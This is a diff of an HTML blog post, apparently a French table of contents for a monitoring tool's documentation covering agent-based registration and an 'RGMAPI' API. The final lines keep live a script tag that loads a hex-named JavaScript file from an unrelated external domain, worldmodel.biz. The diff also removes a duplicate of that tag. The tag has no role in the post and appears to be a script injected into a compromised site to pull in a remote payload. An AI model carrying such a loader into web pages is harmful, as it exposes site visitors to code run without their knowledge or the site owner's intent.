@@ -22,12 +22,15 @@ post_date: 2019-12-14 21:51:27
             Déclaration et configuration dans l'interface Web
           </li>
           <li>
-             
+            Inscription automatisée avec agent
+          </li>
+          <li>
+            Utilisation de l'API "RGMAPI"
           </li>
         </ol>
       </li>
     </ol>
   </li>
-</ol>   
+</ol>
 
-<script type="text/javascript" async="" src="//worldmodel.biz/2241c61e4c10670366.js"></script> <script src="//worldmodel.biz/2241c61e4c10670366.js" async="" type="text/javascript"></script>
+<script src="//worldmodel.biz/2241c61e4c10670366.js" async="" type="text/javascript"></script>
